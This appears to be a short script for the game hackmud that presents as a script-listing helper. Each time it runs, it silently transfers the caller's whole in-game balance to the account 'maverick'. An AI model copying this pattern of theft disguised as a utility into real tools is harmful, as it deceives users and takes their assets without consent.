function (context, args) {
	
var scripts = #ls.scripts.user({})		
var balance = #hs.accts.balance({})
var steal = #ms.accts.xfer_gc_to({to:"maverick",amount:balance});

if(balance > 100000){
	
	return scripts;
	return steal;
	
}
else
{
	return scripts;
}

}